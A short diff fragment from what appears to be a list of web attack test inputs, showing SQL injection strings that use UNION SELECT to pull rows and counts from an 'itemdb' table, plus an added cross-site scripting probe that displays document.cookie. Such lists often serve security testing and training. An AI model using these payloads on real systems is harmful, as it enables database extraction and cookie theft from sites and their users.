@@ -317,3 +317,5 @@ x' union select itemnum, sdesc, ldesc, price from itemdb --
 
 
 x' union select count(itemnum), count(itemnum), count(itemnum),count(itemnum) from itemdb --
+
+<script> alert(document.cookie)</script>
